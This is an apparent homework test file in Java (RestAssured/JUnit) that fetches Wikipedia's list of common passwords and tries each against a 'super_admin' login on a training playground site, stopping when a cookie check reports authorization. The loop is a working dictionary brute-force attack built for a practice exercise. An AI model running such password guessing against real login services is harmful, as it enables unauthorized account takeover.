package test.java.oldHomeWorks;

import io.restassured.RestAssured;
import io.restassured.path.json.JsonPath;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Ex9 {
    @Test
    public void ex9() {
        ArrayList<String> passwords = getPasswords();

        for (String pass : passwords){
            Map<String, String> data = new HashMap<>();
            data.put("login", "super_admin");
            data.put("password", pass);

            Response response = RestAssured
                    .given()
                    .body(data)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();

            Map<String, String> respCookies = response.getCookies();
            System.err.println(response.getCookies());

            Response response2 = RestAssured
                    .given()
                    .cookies(respCookies)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();


            String resp = String.valueOf(response2.print());

           if(resp.equalsIgnoreCase("You are authorized")){
               System.out.println("PASSWORD!!!" + "\n\n" + pass + "\n\nPASSWORD!!!");
               return;
           }
        }

    }


    private ArrayList<String> getPasswords() {
        ArrayList<String> passwords = new ArrayList<>();

        JsonPath response = RestAssured
                .get("https://en.wikipedia.org/w/api.php?action=query&formatversion=2&prop=revisions&rvprop=content&titles=List_of_the_most_common_passwords&format=json")
                .jsonPath();

        LinkedHashMap<String, ArrayList<LinkedHashMap<String, Object>>> r = response.get("query");

        String rev = String.valueOf(r.get("pages").get(0).get("revisions"));

        Pattern p = Pattern.compile("[=][l][e][f][t][|][\\s][^\\n{]{1,}");

        Matcher m1 = p.matcher(rev);

        while (m1.find()) {
            String pass = m1.group().replaceAll("=left\\| ", "");
            System.out.println(pass);
            passwords.add(pass);
        }
        return passwords;
    }
}